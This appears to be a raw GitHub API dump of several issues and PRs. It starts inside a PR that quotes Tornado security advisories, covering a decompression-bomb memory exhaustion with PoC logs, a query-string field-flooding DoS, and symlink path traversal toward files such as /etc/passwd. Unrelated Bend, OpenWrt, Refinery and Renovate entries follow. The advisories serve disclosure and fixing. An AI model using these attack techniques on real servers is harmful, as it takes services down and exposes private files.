**Control:** `victim_simple.py` fetches the identical bomb with the default `SimpleAsyncHTTPClient` → clean `FETCH_FAILED: HTTP 599: Connection closed`, RSS peak ~65 MB (24,984 → 66,712 kB), script exit 0 — the CVE-2026-49855 accounting in `http1connection.py` aborts the transfer, proving the gap is specific to the curl client.\n\n##### PoC source\n\nFull PoC source (**victim_curl.py**, stdlib only, no dependencies): [victim_curl.py](https://gist.github.com/afldl/211c0e7af8175c2eabab53ed037c435d) (secret gist, unlisted).\n\nThe gist carries `evil_server.py` (bomb server), `victim_curl.py` (victim), `victim_simple.py` (control), and `REPRODUCE.md`.\n\n##### Captured output (2026-08-15 run, verbatim excerpts)\n\n```\nevil_server.log:\nBOMB_BUILT wire_bytes=4174525 decompressed_bytes=4294967296 ratio=1029:1\nEVIL_LISTENING 127.0.0.1:8081\nREQUEST_FROM 127.0.0.1:57544 -> GET /bomb HTTP/1.1\nREQUEST_HEADERS:\nGET /bomb HTTP/1.1\nHost: 127.0.0.1:8081\nUser-Agent: Mozilla/5.0 (compatible; pycurl)\nAccept: */*\nAccept-Encoding: gzip,deflate\nWIRE_SENT 65536/4174525\nWIRE_SENT 2162688/4174525\nCLIENT_DIED_MID_TRANSFER wire_sent=2818048/4174525 err=ConnectionResetError(104, 'Connection reset by peer')\n\nvictim_curl_rss.log (VmRSS kB, every 0.2 s):\n0.00  30884\n0.61  231848\n1.41  514720\n2.22  794480\n2.82 1000756\n3.18 1032100        <- last sample before kill\n\ndriver_f1.log:\ntimeout 240 python3 /e2e/F1/victim_curl.py ...  606 Killed\nVICTIM_CURL_EXIT=137         # docker inspect -> OomKilled: true\n\nvictim_simple.log (control, same bomb):\nFETCH_FAILED: HTTP 599: Connection closed\nSCRIPT_FINISHED_NORMALLY     # exit 0, VmRSS peak 66712 kB\n```\n\nHonest framing of the endpoint: the OOM kill at ~1008 MB was forced by the test's 1 GiB cgroup cap as the observation instrument; the \"unbounded\" claim rests on the linear no-plateau RSS curve, death at 67% wire delivery, and the absence of any size accounting in the code path — with more memory the transfer would have continued to the full 4 GiB payload.\n\n##### Impact\n\nDenial of service (memory exhaustion) of any Tornado application that uses the curl HTTP client and fetches attacker-influenced URLs. A single ~4 MB response kills a 1 GiB process in ~3 s; wire cost scales as `available_memory / 1000`. Because the accumulation happens on the shared event loop's client, one malicious response takes down the entire application (all concurrently served users), and a slow endless-body variant drains memory gradually below detection thresholds. The attack requires no privileges, no user interaction, and only that the victim's configured client visits the attacker's origin.\n\n##### Suggested fix\n\nEnforce a byte budget in the write path of `CurlAsyncHTTPClient`: wrap the `WRITEFUNCTION` (both the `buffer.write` branch and the `streaming_callback` branch) in a counter that aborts the transfer (`curl.setopt(pycurl.FAILONERROR)`-style cancellation or raising from the callback) once the received total exceeds `max_body_size`, plumbed from `initialize()` with the same 100 MiB default as `SimpleAsyncHTTPClient`. Because libcurl decompresses before the write callback, the counter naturally measures *decompressed* bytes — the same semantics as the CVE-2026-49855 fix. (`pycurl.MAXFILESIZE` alone is insufficient: it applies to the compressed transfer size.)\n\n##### Affected versions\n\n- **<= 6.5.8** (latest tag; the curl client has never had a response-size limit) and master (`6.6.dev1`, verified 2026-08-15/17).\n- 6.5.6's CVE-2026-49855 fix covered `SimpleAsyncHTTPClient`/`http1connection.py` only; `curl_httpclient.py` was not touched.\n\n##### Credit\n\nReported by the diff/ambidiff security research effort (afldl).\n\n#### Severity\n- CVSS Score: 7.5 / 10 (High)\n- Vector String: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`\n\n#### References\n- [https://github.com/tornadoweb/tornado/security/advisories/GHSA-chx6-46f5-w4vp](https://redirect.github.com/tornadoweb/tornado/security/advisories/GHSA-chx6-46f5-w4vp)\n- [https://github.com/tornadoweb/tornado/pull/3719](https://redirect.github.com/tornadoweb/tornado/pull/3719)\n- [https://github.com/tornadoweb/tornado/commit/15f056080d8e456f92cca8ad0c33e5a5480414ac](https://redirect.github.com/tornadoweb/tornado/commit/15f056080d8e456f92cca8ad0c33e5a5480414ac)\n- [https://github.com/tornadoweb/tornado/commit/6564e0a0922c16f239d3a18adccd04736e380c89](https://redirect.github.com/tornadoweb/tornado/commit/6564e0a0922c16f239d3a18adccd04736e380c89)\n- [https://github.com/tornadoweb/tornado/commit/aa2eb0d989716ac00fe8d7a9919b81c1eccd6ec4](https://redirect.github.com/tornadoweb/tornado/commit/aa2eb0d989716ac00fe8d7a9919b81c1eccd6ec4)\n- [https://github.com/tornadoweb/tornado/commit/e412435febba4569c552c5c9054f1bf92bd171a9](https://redirect.github.com/tornadoweb/tornado/commit/e412435febba4569c552c5c9054f1bf92bd171a9)\n- [https://github.com/tornadoweb/tornado/releases/tag/v6.5.9](https://redirect.github.com/tornadoweb/tornado/releases/tag/v6.5.9)\n- [https://github.com/advisories/GHSA-chx6-46f5-w4vp](https://redirect.github.com/advisories/GHSA-chx6-46f5-w4vp)\n\nThis data is provided by the [GitHub Advisory Database](https://redirect.github.com/advisories/GHSA-chx6-46f5-w4vp) ([CC-BY 4.0](https://redirect.github.com/github/advisory-database/blob/main/LICENSE.md)).\n</details>\n\n---\n\n### Tornado: Unbounded query-string argument count allows event-loop-stalling DoS\n[GHSA-3hv7-mjh2-fv65](https://redirect.github.com/advisories/GHSA-3hv7-mjh2-fv65)\n\n<details>\n<summary>More information</summary>\n\n#### Details\n##### Summary\n\n`HTTPServerRequest.__init__` in `tornado/httputil.py` parses the URL query string via\n`parse_qs_bytes()` with no field-count limit — while the sibling POST-body parsing path\n(`parse_body_arguments`) received a `max_num_fields=1000` cap added earlier in this exact\nsame release (v6.5.8, commit `8d6363ed`), explicitly to bound parsing cost for the identical\nunderlying primitive. This leaves the query-string path with the resource-exhaustion exposure\nthe body-path fix was meant to close.\n\n**File**: `tornado/httputil.py`, line 553 (`HTTPServerRequest.__init__`)\n\n##### Root Cause\n\n```python\n\n##### tornado/httputil.py:553 (before fix)\nself.arguments = parse_qs_bytes(self.query, keep_blank_values=True)\n```\n\nCompare with the POST-body path fixed one commit earlier in the same release:\n\n```python\n\n##### tornado/httputil.py:1038-1041\nuri_arguments = parse_qs_bytes(\n    body,\n    keep_blank_values=True,\n    max_num_fields=config.urlencoded.max_arguments,  # default 1000\n)\n```\n\nBoth call sites funnel through the same `tornado.escape.parse_qs_bytes` (a thin wrapper over\n`urllib.parse.parse_qs`), which is exactly why `max_num_fields` was added to\n`urllib.parse.parse_qsl` upstream — to let frameworks bound field count. The fix was applied\nonly to the body path; the query-string path was missed.\n\nThe request line + headers together are capped at `max_header_size` (default 65536 bytes), so\nthis is not literally unbounded, but a single ~64KB request line can carry thousands of short\n`key=value` pairs — far beyond the 1000-field limit the maintainer judged appropriate for the\nstructurally identical body case.\n\n##### Attack Scenario\n\n1. Attacker sends a `GET` request whose query string is packed with thousands of short fields\n   (e.g. `k0=1&k1=1&...&k7799=1`, ~61KB), fitting comfortably under `max_header_size`. No\n   authentication, cookies, or prior state required.\n2. Tornado accepts and parses this with no field-count cap, unlike the equivalent POST-body\n   request (which is correctly rejected with 400 once >1000 fields are present).\n3. Parsing thousands of fields is CPU work performed synchronously inside Tornado's\n   single-threaded `IOLoop`. Several such requests in flight concurrently stall the event\n   loop, delaying processing of *all* other connections on that loop — not just the\n   attacker's own request.\n\n##### Verification (dynamic, local reproduction against v6.5.8)\n\nRan the unmodified v6.5.8 source directly (no external dependencies needed) with a minimal\n`tornado.web.Application` on `127.0.0.1:8888`.\n\n- Identical 7800-field/~61KB payload sent as GET query string → `200 OK`; sent as POST body\n  (`application/x-www-form-urlencoded`) → `400 Bad Request` (correctly rejected by the\n  existing `max_num_fields` body-path limit). This confirms the asymmetry directly.\n- Per-request parse cost: baseline (`/?a=1`) averaged 1.86ms; the 7800-field query string\n  averaged 25.1ms (~13x).\n- Event-loop-blocking amplification (raw-socket test, isolating server-side stall from\n  client overhead): with 10 sequential baseline probe requests fired with no load, average\n  latency was 1.47ms (max 5.9ms). With 5 concurrent 61KB/7800-field requests in flight,\n  the same baseline probes averaged 13.0ms (max 118.1ms) — an **8.9x average slowdown** for\n  unrelated clients, produced by ~305KB of unauthenticated attacker traffic.\n\n##### Impact\n\nAll Tornado servers/applications are affected — this triggers on every request with a query\nstring, independent of application/handler logic. An unauthenticated, unprivileged remote\nattacker can measurably degrade response times for all other clients sharing the same\n`IOLoop`, using a small amount of bandwidth and no special conditions. This is an\navailability/DoS concern; no confidentiality or integrity impact.\n\n##### Recommended Fix\n\n```python\n\n##### tornado/httputil.py — HTTPServerRequest.__init__\nif uri is not None:\n    self.path, sep, self.query = uri.partition(\"?\")\ntry:\n    self.arguments = parse_qs_bytes(\n        self.query,\n        keep_blank_values=True,\n        max_num_fields=_DEFAULT_PARSE_BODY_CONFIG.urlencoded.max_arguments,\n    )\nexcept ValueError as e:\n    raise HTTPInputError(\"Invalid query string: %s\" % e) from e\n```\n\nThis reuses the existing `ParseUrlEncodedConfig.max_arguments` default (1000) via the\nmodule's `_DEFAULT_PARSE_BODY_CONFIG`, matching the POST-body limit and honoring any global\noverride via `set_parse_body_config()`. The `try/except` is necessary because — unlike\n`parse_body_arguments`, which already wraps its call and converts `ValueError` into a clean\n`HTTPInputError`/400 — the query-string call site currently has no such handling, so without\nit, a request exceeding the limit would raise an uncaught `ValueError` instead of a clean 400.\n\nVerified: with the fix applied, requests with ≤1000 query-string fields are unaffected;\nrequests with >1000 fields are rejected with `400 Bad Request` (consistent with the POST-body\nbehavior); Tornado's own `httputil_test` and `web_test` suites (256 tests) pass unchanged.\n\n#### Severity\n- CVSS Score: 5.3 / 10 (Medium)\n- Vector String: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L`\n\n#### References\n- [https://github.com/tornadoweb/tornado/security/advisories/GHSA-3hv7-mjh2-fv65](https://redirect.github.com/tornadoweb/tornado/security/advisories/GHSA-3hv7-mjh2-fv65)\n- [https://github.com/tornadoweb/tornado/pull/3719](https://redirect.github.com/tornadoweb/tornado/pull/3719)\n- [https://github.com/tornadoweb/tornado/commit/03945136ea9746eccf61caf88edae39642e59c93](https://redirect.github.com/tornadoweb/tornado/commit/03945136ea9746eccf61caf88edae39642e59c93)\n- [https://github.com/tornadoweb/tornado/commit/8a61dd6005f42733015160f3c23a2bcffe200542](https://redirect.github.com/tornadoweb/tornado/commit/8a61dd6005f42733015160f3c23a2bcffe200542)\n- [https://github.com/tornadoweb/tornado/releases/tag/v6.5.9](https://redirect.github.com/tornadoweb/tornado/releases/tag/v6.5.9)\n- [https://github.com/advisories/GHSA-3hv7-mjh2-fv65](https://redirect.github.com/advisories/GHSA-3hv7-mjh2-fv65)\n\nThis data is provided by the [GitHub Advisory Database](https://redirect.github.com/advisories/GHSA-3hv7-mjh2-fv65) ([CC-BY 4.0](https://redirect.github.com/github/advisory-database/blob/main/LICENSE.md)).\n</details>\n\n---\n\n### Tornado: StaticFileHandler follows symlinks outside static root (path traversal)\n[GHSA-c2m8-h5v5-343r](https://redirect.github.com/advisories/GHSA-c2m8-h5v5-343r)\n\n<details>\n<summary>More information</summary>\n\n#### Details\n##### Summary\nStaticFileHandler allows an unauthenticated attacker to read arbitrary files from the server's filesystem by requesting a path that resolves to a symbolic link placed inside the static root directory. Any application that serves user-uploadable content, or whose static directory is populated by a build/deploy pipeline that creates symlinks (e.g. npm link, webpack, Docker volume mounts, CDN sync tools), is affected. An attacker who can trigger the creation of a symlink pointing outside the static root—or exploit one that already exists—can retrieve sensitive files such as /etc/passwd, private keys, configuration files, or application secrets.\n\n##### Details\nThe vulnerability is in tornado.web.StaticFileHandler, specifically in the interaction between two methods in [tornado/web.py](vscode-webview://1grdaaa6v64itrol06qu70pq3d1b9h9im5c3npvvc9snaprc1q9f/tornado/web.py):\n- [get_absolute_path](https://redirect.github.com/tornado\n\n> [!IMPORTANT]\n> ✂ PR body was truncated to here.\n","reactions":{"url":"https://api.github.com/repos/Future-House/ldp/issues/503/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/Future-House/ldp/issues/503/timeline","performed_via_github_app":null,"state_reason":null,"score":1.0},{"url":"https://api.github.com/repos/bendlang/bend/issues/2094","repository_url":"https://api.github.com/repos/bendlang/bend","labels_url":"https://api.github.com/repos/bendlang/bend/issues/2094/labels{/name}","comments_url":"https://api.github.com/repos/bendlang/bend/issues/2094/comments","events_url":"https://api.github.com/repos/bendlang/bend/issues/2094/events","html_url":"https://github.com/bendlang/bend/issues/2094","id":6269632482,"node_id":"I_kwDOKNDdxM8AAAABdbL_4g","number":2094,"title":"Metal: IR evaluator works on CPU but fails on M1 Max","user":{"login":"IlyaGulya","id":668727,"node_id":"MDQ6VXNlcjY2ODcyNw==","avatar_url":"https://avatars.githubusercontent.com/u/668727?v=4","gravatar_id":"","url":"https://api.github.com/users/IlyaGulya","html_url":"https://github.com/IlyaGulya","followers_url":"https://api.github.com/users/IlyaGulya/followers","following_url":"https://api.github.com/users/IlyaGulya/following{/other_user}","gists_url":"https://api.github.com/users/IlyaGulya/gists{/gist_id}","starred_url":"https://api.github.com/users/IlyaGulya/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/IlyaGulya/subscriptions","organizations_url":"https://api.github.com/users/IlyaGulya/orgs","repos_url":"https://api.github.com/users/IlyaGulya/repos","events_url":"https://api.github.com/users/IlyaGulya/events{/privacy}","received_events_url":"https://api.github.com/users/IlyaGulya/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[],"state":"open","locked":false,"assignees":[{"login":"nicolas-abril","id":4893601,"node_id":"MDQ6VXNlcjQ4OTM2MDE=","avatar_url":"https://avatars.githubusercontent.com/u/4893601?v=4","gravatar_id":"","url":"https://api.github.com/users/nicolas-abril","html_url":"https://github.com/nicolas-abril","followers_url":"https://api.github.com/users/nicolas-abril/followers","following_url":"https://api.github.com/users/nicolas-abril/following{/other_user}","gists_url":"https://api.github.com/users/nicolas-abril/gists{/gist_id}","starred_url":"https://api.github.com/users/nicolas-abril/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/nicolas-abril/subscriptions","organizations_url":"https://api.github.com/users/nicolas-abril/orgs","repos_url":"https://api.github.com/users/nicolas-abril/repos","events_url":"https://api.github.com/users/nicolas-abril/events{/privacy}","received_events_url":"https://api.github.com/users/nicolas-abril/received_events","type":"User","user_view_type":"public","site_admin":false}],"milestone":null,"comments":1,"created_at":"2026-11-08T09:39:40Z","updated_at":"2026-11-10T17:26:20Z","closed_at":null,"assignee":{"login":"nicolas-abril","id":4893601,"node_id":"MDQ6VXNlcjQ4OTM2MDE=","avatar_url":"https://avatars.githubusercontent.com/u/4893601?v=4","gravatar_id":"","url":"https://api.github.com/users/nicolas-abril","html_url":"https://github.com/nicolas-abril","followers_url":"https://api.github.com/users/nicolas-abril/followers","following_url":"https://api.github.com/users/nicolas-abril/following{/other_user}","gists_url":"https://api.github.com/users/nicolas-abril/gists{/gist_id}","starred_url":"https://api.github.com/users/nicolas-abril/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/nicolas-abril/subscriptions","organizations_url":"https://api.github.com/users/nicolas-abril/orgs","repos_url":"https://api.github.com/users/nicolas-abril/repos","events_url":"https://api.github.com/users/nicolas-abril/events{/privacy}","received_events_url":"https://api.github.com/users/nicolas-abril/received_events","type":"User","user_view_type":"public","site_admin":false},"author_association":"NONE","issue_field_values":[],"type":null,"active_lock_reason":null,"sub_issues_summary":{"total":0,"completed":0,"percent_completed":0},"issue_dependencies_summary":{"blocked_by":0,"total_blocked_by":0,"blocking":0,"total_blocking":0},"body":"## Reproducer\n\nhttps://github.com/IlyaGulya/bend-metal-repro\n\nIncludes the source, build/run instructions, pinned compiler version, and candidate patch.\n\nThe input is three IR nodes:\n\n```bend\n[Ir.ISlot{0}, Ir.IInt{1}, Ir.IAdd{0,1}]\n```\n\nState slot 0 contains `2`. The full evaluator module is included: a smaller standalone evaluator did not reproduce the failure. No model checking or BFS runs in this example.\n\n## Results\n\nCPU and Metal use the same original binary.\n\n| Input node | Original CPU | Original Metal | Patched Metal |\n|---|---|---|---|\n| `0` | `2` | fails | `2` |\n| `1` | `1` | fails | `1` |\n| `2` | `3` | fails | `3` |\n\nThe recorded error is `frontier drained without a result`. Earlier runs also produced `a function the device does not hold` or `memory fault (machine stack overflow?)`.\n\nEnvironment: M1 Max, 32 GPU cores, Darwin 25.6.0, Apple clang 21. C generated on Linux with Bun 1.4.4. Native runs use `--threads 4` and `--gpu 512MB`.\n\n## Candidate workaround\n\n[Patch](https://github.com/IlyaGulya/bend-metal-repro/blob/master/patches/bend-device-work-dispatch.patch)\n\nThe patch replaces device Work self-loops with VM redispatch, reloading entry/frame arguments. It leaves the original inliner, host path, and native flat loops unchanged.\n\nThis makes the reproducer pass on actual Metal, without CPU fallback. The same patch passed 23 full-checker CPU/Metal cases and 23 comparisons against TLC.\n\nThis is a workaround, not a confirmed root-cause fix. It may avoid a Metal compiler defect rather than repair invalid Bend lowering. Current main, CUDA, and general performance impact were not tested.\n\nPossibly related: #1954 and #1978. A shared root cause has not been established.\n","reactions":{"url":"https://api.github.com/repos/bendlang/bend/issues/2094/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/bendlang/bend/issues/2094/timeline","performed_via_github_app":null,"state_reason":null,"pinned_comment":null,"score":1.0},{"url":"https://api.github.com/repos/openwrt/openwrt/issues/19644","repository_url":"https://api.github.com/repos/openwrt/openwrt","labels_url":"https://api.github.com/repos/openwrt/openwrt/issues/19644/labels{/name}","comments_url":"https://api.github.com/repos/openwrt/openwrt/issues/19644/comments","events_url":"https://api.github.com/repos/openwrt/openwrt/issues/19644/events","html_url":"https://github.com/openwrt/openwrt/pull/19644","id":3287106339,"node_id":"PR_kwDOArsuZM6h4kqr","number":19644,"title":"kernel: modules: netdevices: improve Realtek DSA driver","user":{"login":"namiltd","id":2226999,"node_id":"MDQ6VXNlcjIyMjY5OTk=","avatar_url":"https://avatars.githubusercontent.com/u/2226999?v=4","gravatar_id":"","url":"https://api.github.com/users/namiltd","html_url":"https://github.com/namiltd","followers_url":"https://api.github.com/users/namiltd/followers","following_url":"https://api.github.com/users/namiltd/following{/other_user}","gists_url":"https://api.github.com/users/namiltd/gists{/gist_id}","starred_url":"https://api.github.com/users/namiltd/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/namiltd/subscriptions","organizations_url":"https://api.github.com/users/namiltd/orgs","repos_url":"https://api.github.com/users/namiltd/repos","events_url":"https://api.github.com/users/namiltd/events{/privacy}","received_events_url":"https://api.github.com/users/namiltd/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[{"id":793818317,"node_id":"MDU6TGFiZWw3OTM4MTgzMTc=","url":"https://api.github.com/repos/openwrt/openwrt/labels/kernel","name":"kernel","color":"D60BB3","default":false,"description":"pull request/issue with Linux kernel related changes","archived_at":null,"archived_by":null},{"id":793819779,"node_id":"MDU6TGFiZWw3OTM4MTk3Nzk=","url":"https://api.github.com/repos/openwrt/openwrt/labels/core%20packages","name":"core packages","color":"F5D63D","default":false,"description":"pull request/issue for core (in-tree) packages","archived_at":null,"archived_by":null}],"state":"open","locked":false,"assignees":[],"milestone":null,"comments":145,"created_at":"2025-08-03T11:51:03Z","updated_at":"2026-11-10T17:26:07Z","closed_at":null,"assignee":null,"author_association":"CONTRIBUTOR","issue_field_values":[],"type":null,"active_lock_reason":null,"draft":true,"pull_request":{"url":"https://api.github.com/repos/openwrt/openwrt/pulls/19644","html_url":"https://github.com/openwrt/openwrt/pull/19644","diff_url":"https://github.com/openwrt/openwrt/pull/19644.diff","patch_url":"https://github.com/openwrt/openwrt/pull/19644.patch","merged_at":null},"body":"Allows switching from realtek,rtl8367b and mediatek,rtk-gsw drivers to realtek,rtl8365mb driver (forum: https://forum.openwrt.org/t/reduce-number-of-drivers-for-rtl8367s).\r\n - ~fix mode mask calculation~ - already implemented\r\n - ~add VLAN and Bridging support to Realtek rtl8365mb DSA switch~ - already implemented\r\n - ~add SGMII and HSGMII mode support~ - already implemented\r\n - ~add support for rtl8367sb~ - already implemented\r\n - add support for rtl8367s-vb \r\n\r\n\r\nThis patch is used in:\r\n - https://github.com/openwrt/openwrt/pull/19397\r\n - https://github.com/openwrt/openwrt/pull/19445\r\n - https://github.com/openwrt/openwrt/pull/24861\r\n - [OpenWrt switch hardware project](https://github.com/AlbrechtL/rpi-managed-switch-4-port)\r\n   - https://github.com/AlbrechtL/openwrt/tree/rpi_managed_switch","reactions":{"url":"https://api.github.com/repos/openwrt/openwrt/issues/19644/reactions","total_count":4,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":4,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/openwrt/openwrt/issues/19644/timeline","performed_via_github_app":null,"state_reason":null,"score":1.0},{"url":"https://api.github.com/repos/honeycombio/refinery/issues/1887","repository_url":"https://api.github.com/repos/honeycombio/refinery","labels_url":"https://api.github.com/repos/honeycombio/refinery/issues/1887/labels{/name}","comments_url":"https://api.github.com/repos/honeycombio/refinery/issues/1887/comments","events_url":"https://api.github.com/repos/honeycombio/refinery/issues/1887/events","html_url":"https://github.com/honeycombio/refinery/pull/1887","id":6045712000,"node_id":"PR_kwDOCR97BM8AAAABK14_mQ","number":1887,"title":"feat: Allow configuration of mTLS client certificates for upstream traffic","user":{"login":"mterhar","id":938684,"node_id":"MDQ6VXNlcjkzODY4NA==","avatar_url":"https://avatars.githubusercontent.com/u/938684?v=4","gravatar_id":"","url":"https://api.github.com/users/mterhar","html_url":"https://github.com/mterhar","followers_url":"https://api.github.com/users/mterhar/followers","following_url":"https://api.github.com/users/mterhar/following{/other_user}","gists_url":"https://api.github.com/users/mterhar/gists{/gist_id}","starred_url":"https://api.github.com/users/mterhar/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/mterhar/subscriptions","organizations_url":"https://api.github.com/users/mterhar/orgs","repos_url":"https://api.github.com/users/mterhar/repos","events_url":"https://api.github.com/users/mterhar/events{/privacy}","received_events_url":"https://api.github.com/users/mterhar/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[{"id":1091252429,"node_id":"MDU6TGFiZWwxMDkxMjUyNDI5","url":"https://api.github.com/repos/honeycombio/refinery/labels/type:%20enhancement","name":"type: enhancement","color":"cce6ff","default":false,"description":"New feature or request","archived_at":null,"archived_by":null}],"state":"closed","locked":false,"assignees":[],"milestone":null,"comments":1,"created_at":"2026-10-26T18:23:44Z","updated_at":"2026-11-10T17:26:04Z","closed_at":"2026-11-10T17:26:01Z","assignee":null,"author_association":"CONTRIBUTOR","issue_field_values":[],"type":null,"active_lock_reason":null,"draft":false,"pull_request":{"url":"https://api.github.com/repos/honeycombio/refinery/pulls/1887","html_url":"https://github.com/honeycombio/refinery/pull/1887","diff_url":"https://github.com/honeycombio/refinery/pull/1887.diff","patch_url":"https://github.com/honeycombio/refinery/pull/1887.patch","merged_at":"2026-11-10T17:26:01Z"},"body":"## Which problem is this PR solving?\n\nRefinery can't present a client certificate or trust a private CA when sending to its upstream Honeycomb API, so it can't send through an mTLS proxy.\n\n## Short description of the changes\n\n- Adds `Network.UpstreamTLSCertFile`, `UpstreamTLSKeyFile`, and `UpstreamTLSCAFile`\n- Applies them to traffic to `HoneycombAPI` (forwarded events and `/1/auth` lookups) and to the Honeycomb logger\n- Reloads the client cert/key when the files change; keeps the last good cert if a reload fails\n- Warns when a reload fails, when the cert in use is expired or nearly expired, and when a private CA would block Honeycomb logger output sent somewhere other than `HoneycombAPI`\n- Unreadable cert/key/CA files fail config validation; cert and key must be set together\n- Logs the upstream TLS settings at startup when they're set\n- Adds a README section on sending through an mTLS proxy, including Kubernetes and Helm\n\nRefinery's OTel metrics and traces, peer traffic, OpAMP, and HTTP(S) config fetching are unchanged; OTel telemetry that needs mTLS can go through a Collector. CA and path changes require a restart.\n\n## How to try it\n\n```sh\nopenssl req -x509 -newkey ec -pkeyopt ec_paramgen_curve:P-256 -nodes -subj /CN=test-ca -keyout ca.key -out ca.crt -days 1\nopenssl req -newkey ec -pkeyopt ec_paramgen_curve:P-256 -nodes -subj /CN=localhost -keyout server.key -out server.csr\nopenssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key -out server.crt -days 1 -extfile <(printf 'subjectAltName=IP:127.0.0.1')\nopenssl req -newkey ec -pkeyopt ec_paramgen_curve:P-256 -nodes -subj /CN=refinery -keyout client.key -out client.csr\nopenssl x509 -req -in client.csr -CA ca.crt -CAkey ca.key -out client.crt -days 1\n\n# upstream that requires a client cert\nopenssl s_server -accept 9443 -cert server.crt -key server.key -CAfile ca.crt -Verify 1 -verify_return_error -www\n```\n\nIn `config.yaml`:\n\n```yaml\nNetwork:\n  HoneycombAPI: https://127.0.0.1:9443\n  UpstreamTLSCertFile: client.crt\n  UpstreamTLSKeyFile: client.key\n  UpstreamTLSCAFile: ca.crt\n```\n\nSend an event to Refinery; `s_server` prints `depth=0 CN = refinery`. Remove the cert and key lines and the handshake fails with `peer did not return a certificate`.\n\n\n\n\n","reactions":{"url":"https://api.github.com/repos/honeycombio/refinery/issues/1887/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/honeycombio/refinery/issues/1887/timeline","performed_via_github_app":null,"state_reason":null,"score":1.0},{"url":"https://api.github.com/repos/ncaq/dotfiles/issues/616","repository_url":"https://api.github.com/repos/ncaq/dotfiles","labels_url":"https://api.github.com/repos/ncaq/dotfiles/issues/616/labels{/name}","comments_url":"https://api.github.com/repos/ncaq/dotfiles/issues/616/comments","events_url":"https://api.github.com/repos/ncaq/dotfiles/issues/616/events","html_url":"https://github.com/ncaq/dotfiles/issues/616","id":3968351944,"node_id":"I_kwDOCd8ZTc7siD7I","number":616,"title":"Dependency Dashboard","user":{"login":"renovate[bot]","id":29139614,"node_id":"MDM6Qm90MjkxMzk2MTQ=","avatar_url":"https://avatars.githubusercontent.com/in/2740?v=4","gravatar_id":"","url":"https://api.github.com/users/renovate%5Bbot%5D","html_url":"https://github.com/apps/renovate","followers_url":"https://api.github.com/users/renovate%5Bbot%5D/followers","following_url":"https://api.github.com/users/renovate%5Bbot%5D/following{/other_user}","gists_url":"https://api.github.com/users/renovate%5Bbot%5D/gists{/gist_id}","starred_url":"https://api.github.com/users/renovate%5Bbot%5D/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/renovate%5Bbot%5D/subscriptions","organizations_url":"https://api.github.com/users/renovate%5Bbot%5D/orgs","repos_url":"https://api.github.com/users/renovate%5Bbot%5D/repos","events_url":"https://api.github.com/users/renovate%5Bbot%5D/events{/privacy}","received_events_url":"https://api.github.com/users/renovate%5Bbot%5D/received_events","type":"Bot","user_view_type":"public","site_admin":false},"labels":[],"state":"open","locked":false,"assignees":[],"milestone":null,"comments":0,"created_at":"2026-02-20T12:34:02Z","updated_at":"2026-11-10T17:24:38Z","closed_at":null,"assignee":null,"author_association":"CONTRIBUTOR","active_lock_reason":null,"sub_issues_summary":{"total":0,"completed":0,"percent_completed":0},"issue_dependencies_summary":{"blocked_by":0,"total_blocked_by":0,"blocking":0,"total_blocking":0},"body":"This issue lists Renovate updates and detected dependencies. Read the [Dependency Dashboard](https://docs.renovatebot.com/key-concepts/dashboard/) docs to learn more.<br>[View this repository on the Mend.io Web Portal](https://developer.mend.io/github/ncaq/dotfiles).\n\n## Abandoned Dependencies\n\nThe following dependencies have not received updates for an extended period and may be unmaintained.\n\n> [!NOTE]\n> Packages are marked as abandoned when they exceed the [`abandonmentThreshold`](https://docs.renovatebot.com/configuration-options/#abandonmentthreshold) since their last release. Unlike deprecated packages with official notices, abandonment is detected by release inactivity.\n> \n<details>\n<summary>View abandoned dependencies (1)</summary>\n\n| Datasource | Package | Last Updated |\n|------------|------|-------------|\n| cargo | [half](https://redirect.github.com/VoidStarKat/half-rs) | `2025-10-14` |\n\n</details>\n\n\n## Pending Status Checks\n\nThe following updates await pending status checks. To force their creation now, click on a checkbox below.\n\n - [ ] <!-- unpend-branch=renovate/ncaq-nix-composite-action-3.x -->build(deps): update ncaq/nix-composite-action action to v3.0.6\n - [ ] <!-- unpend-branch=renovate/megaparsec-9.8.x -->build(deps): update dependency megaparsec to v9.8\n\n## Open\n\nThe following updates have all been created. To force a retry/rebase of any, click on a checkbox below.\n\n - [ ] <!-- rebase-branch=renovate/lock-file-maintenance -->[build(deps): lock file maintenance](../pull/1646)\n\n## PR Closed (Blocked)\n\nThe following updates are blocked by an existing closed PR. To recreate the PR, click on a checkbox below.\n\n - [ ] <!-- recreate-branch=renovate/typescript-7.x -->[build(deps-dev): update dependency typescript to v7](../pull/1350)\n - [ ] <!-- recreate-branch=renovate/ubuntu-26.x -->[build(deps): update dependency ubuntu to v26](../pull/1565)\n\n## Detected Dependencies\n\n<details><summary>cargo (1)</summary>\n<blockquote>\n\n<details><summary>pkgs/safetensors-fp16/Cargo.toml (6)</summary>\n\n - `anyhow 1`\n - `clap 4`\n - `half 2`\n - `memmap2 0.9`\n - `safetensors 0.8`\n - `tempfile =3.27.0`\n\n</details>\n\n</blockquote>\n</details>\n\n<details><summary>github-actions (4)</summary>\n<blockquote>\n\n<details><summary>.github/actio